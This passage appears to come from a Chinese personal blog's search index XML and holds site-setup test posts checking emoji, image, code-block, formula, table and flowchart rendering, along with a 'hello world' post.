            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表情测试</title>
      <link href="/2023/08/15/%E8%A1%A8%E6%83%85%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/15/%E8%A1%A8%E6%83%85%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>表情渲染也修复好了，测试一下</p><p><span class="emoji" alias="neutral_face" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f610.png?v8">&#x1f610;</span><span class="emoji" alias="smile" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">&#x1f604;</span><span class="emoji" alias="laughing" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">&#x1f606;</span><span class="emoji" alias="blush" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60a.png?v8">&#x1f60a;</span><span class="emoji" alias="smiley" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png?v8">&#x1f603;</span><span class="emoji" alias="relaxed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/263a.png?v8">&#x263a;</span><span class="emoji" alias="smirk" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60f.png?v8">&#x1f60f;</span><span class="emoji" alias="heart_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60d.png?v8">&#x1f60d;</span><span class="emoji" alias="kissing_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f618.png?v8">&#x1f618;</span><span class="emoji" alias="kissing_closed_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61a.png?v8">&#x1f61a;</span><span class="emoji" alias="flushed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f633.png?v8">&#x1f633;</span><span class="emoji" alias="relieved" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60c.png?v8">&#x1f60c;</span><span class="emoji" alias="satisfied" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">&#x1f606;</span><span class="emoji" alias="grin" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">&#x1f601;</span><span class="emoji" alias="wink" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f609.png?v8">&#x1f609;</span><span class="emoji" alias="stuck_out_tongue_winking_eye" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8">&#x1f61c;</span><span class="emoji" alias="stuck_out_tongue_closed_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">&#x1f61d;</span><span class="emoji" alias="grinning" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f600.png?v8">&#x1f600;</span><span class="emoji" alias="kissing" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f617.png?v8">&#x1f617;</span><span class="emoji" alias="kissing_smiling_eyes" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f619.png?v8">&#x1f619;</span><span class="emoji" alias="stuck_out_tongue" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png?v8">&#x1f61b;</span><span class="emoji" alias="sleeping" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f634.png?v8">&#x1f634;</span><span class="emoji" alias="worried" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61f.png?v8">&#x1f61f;</span><span class="emoji" alias="frowning" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f626.png?v8">&#x1f626;</span><span class="emoji" alias="anguished" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f627.png?v8">&#x1f627;</span><span class="emoji" alias="open_mouth" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62e.png?v8">&#x1f62e;</span><span class="emoji" alias="grimacing" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62c.png?v8">&#x1f62c;</span><span class="emoji" alias="confused" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f615.png?v8">&#x1f615;</span><span class="emoji" alias="hushed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62f.png?v8">&#x1f62f;</span><span class="emoji" alias="expressionless" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f611.png?v8">&#x1f611;</span><span class="emoji" alias="unamused" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f612.png?v8">&#x1f612;</span><span class="emoji" alias="sweat_smile" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8">&#x1f605;</span><span class="emoji" alias="sweat" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">&#x1f613;</span><span class="emoji" alias="disappointed_relieved" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f625.png?v8">&#x1f625;</span><span class="emoji" alias="weary" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8">&#x1f629;</span><span class="emoji" alias="pensive" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f614.png?v8">&#x1f614;</span><span class="emoji" alias="disappointed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61e.png?v8">&#x1f61e;</span><span class="emoji" alias="confounded" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f616.png?v8">&#x1f616;</span><span class="emoji" alias="fearful" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f628.png?v8">&#x1f628;</span><span class="emoji" alias="cold_sweat" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">&#x1f630;</span><span class="emoji" alias="persevere" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f623.png?v8">&#x1f623;</span><span class="emoji" alias="cry" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">&#x1f622;</span><span class="emoji" alias="sob" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">&#x1f62d;</span><span class="emoji" alias="joy" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">&#x1f602;</span><span class="emoji" alias="astonished" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f632.png?v8">&#x1f632;</span><span class="emoji" alias="scream" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f631.png?v8">&#x1f631;</span><span class="emoji" alias="thought_balloon" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ad.png?v8">&#x1f4ad;</span><span class="emoji" alias="tired_face" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62b.png?v8">&#x1f62b;</span><span class="emoji" alias="angry" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f620.png?v8">&#x1f620;</span><span class="emoji" alias="rage" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f621.png?v8">&#x1f621;</span><span class="emoji" alias="triumph" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f624.png?v8">&#x1f624;</span><span class="emoji" alias="sleepy" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62a.png?v8">&#x1f62a;</span><span class="emoji" alias="yum" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60b.png?v8">&#x1f60b;</span><span class="emoji" alias="mask" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f637.png?v8">&#x1f637;</span><span class="emoji" alias="sunglasses" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8">&#x1f60e;</span><span class="emoji" alias="dizzy_face" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f635.png?v8">&#x1f635;</span><span class="emoji" alias="imp" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f47f.png?v8">&#x1f47f;</span><span class="emoji" alias="smiling_imp" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8">&#x1f608;</span><span class="emoji" alias="speech_balloon" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ac.png?v8">&#x1f4ac;</span><span class="emoji" alias="no_mouth" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f636.png?v8">&#x1f636;</span><span class="emoji" alias="innocent" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f607.png?v8">&#x1f607;</span><span class="emoji" alias="alien" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f47d.png?v8">&#x1f47d;</span><span class="emoji" alias="yellow_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49b.png?v8">&#x1f49b;</span><span class="emoji" alias="blue_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f499.png?v8">&#x1f499;</span><span class="emoji" alias="purple_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49c.png?v8">&#x1f49c;</span><span class="emoji" alias="heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2764.png?v8">&#x2764;</span><span class="emoji" alias="green_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49a.png?v8">&#x1f49a;</span><span class="emoji" alias="broken_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f494.png?v8">&#x1f494;</span><span class="emoji" alias="heartbeat" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f493.png?v8">&#x1f493;</span><span class="emoji" alias="heartpulse" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f497.png?v8">&#x1f497;</span><span class="emoji" alias="two_hearts" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f495.png?v8">&#x1f495;</span><span class="emoji" alias="revolving_hearts" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49e.png?v8">&#x1f49e;</span><span class="emoji" alias="cupid" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f498.png?v8">&#x1f498;</span><span class="emoji" alias="sparkling_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f496.png?v8">&#x1f496;</span><span class="emoji" alias="sparkles" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png?v8">&#x2728;</span></p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片测试</title>
      <link href="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>花了点时间把站点的图片渲染插件修好了，现在展示图片应该没问题了，下面放几张壁纸测试一下</p><p><img src="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/image-20230815074655175.png" alt="image-20230815074655175"></p><p><img src="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/image-20230815074722240.png" alt="image-20230815074722240"></p><p><img src="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/image-20230815074733533-1692099736414-1.png" alt="image-20230815074733533"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站说明</title>
      <link href="/2023/08/13/%E5%BB%BA%E7%AB%99%E8%AF%B4%E6%98%8E/"/>
      <url>/2023/08/13/%E5%BB%BA%E7%AB%99%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<p>一时兴起，决定搭建个博客玩玩。主要也不知道写什么，博客会慢慢完善。看了很多博客主题，感觉个人还是喜欢素一点的。现在发展的太快了，各类优秀的博客主题不断涌现，内容过于丰富。对我而言，还是朴素些吧，朴素拥有无数潜能，也能享受到开发一个又一个模块的乐趣。我会测试一些markdown的渲染，我对markdown解析的要求不高，能写字就行，用不着什么高亮、流程图之类的，适合自己的就好，相应的插件会慢慢补上和调试</p><p>下面测试代码块、公式块、表格、表情</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">这是代码块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">$x &#x3D; &quot;just go go!&quot; ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是简单公式块<br>$$<br>7x \times 2y \neq 3z<br>$$</p><p>$$<br>7x + 2y &#x3D; 3z<br>$$</p><p>$$<br>x^3+x^9+x^y<br>$$</p><p>这是复杂公式块<br>$$<br>\Gamma(z) &#x3D; \int_0^\infty t^{z-1}e^{-t}dt,.<br>\Gamma(z) &#x3D; \int_0^\infty t^{z-1}e^{-t}dt,.<br>$$</p><p>$$<br>\lim\limits_{x \to \infty} \exp(-x) &#x3D; 0<br>$$</p><p>$$<br>X(m,n)&#x3D;<br>\begin{cases}<br>x(n),\<br>x(n-1),\<br>x(n+1)<br>\end{cases}<br>$$</p><p>这是表格</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>这是雪人表情</p><p><span class="emoji" alias="snowman" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26c4.png?v8">&#x26c4;</span></p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流程图测试</title>
      <link href="/2023/08/13/%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/13/%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>修好了流程图的渲染，现在支持mermaid和flowchart等主流流程图的渲染了</p><p>mermaid流程图</p><pre class="mermaid">sequenceDiagram    loop Daily query        Alice->>Bob: Hello Bob, how are you?        alt is sick            Bob->>Alice: Not so good :(        else is well            Bob->>Alice: Feeling fresh like a daisy        end        opt Extra response            Bob->>Alice: Thanks for asking        end    end</pre><pre class="mermaid">graph TD    B((开始)) -->C{判断}    C --  a=1 -->D[执行语句1]    C --  a=2  -->E[执行语句2]    C --  a=3 -->F[执行语句3]    C -- a=4  -->G[执行语句4]    D--> AA((结束))    E--> AA    F--> AA   G--> AA</pre><pre class="mermaid">graph TD;    A-->B;    A-->C;    B-->D;    C-->D;</pre><p>flowchart流程图</p><div id="flowchart-0" class="flow-chart"></div><div id="flowchart-1" class="flow-chart"></div><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 开始节点in=>inputoutput: 输入e=>end: 结束节点op=>operation: 操作节点cond=>condition: 条件节点sub=>subroutine: 子例程out=>inputoutput: 输出st(right)->in->op->condcond(yes,right)->out->econd(no)->sub</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">st=>start: Starti=>inputoutput: 输入年份ncond1=>condition: n能否被4整除？cond2=>condition: n能否被100整除？cond3=>condition: n能否被400整除？o1=>inputoutput: 输出非闰年o2=>inputoutput: 输出非闰年o3=>inputoutput: 输出闰年o4=>inputoutput: 输出闰年e=>endst->i->cond1cond1(no)->o1->econd1(yes)->cond2cond2(no)->o3->econd2(yes)->cond3cond3(yes)->o2->econd3(no)->o4->e</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，世界</title>
      <link href="/2023/08/12/%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/"/>
      <url>/2023/08/12/%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1>你好，世界</h1><!DOCTYPE html><html><head><meta charset="utf-8"><title>test</title></head><body><p>你好，世界</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
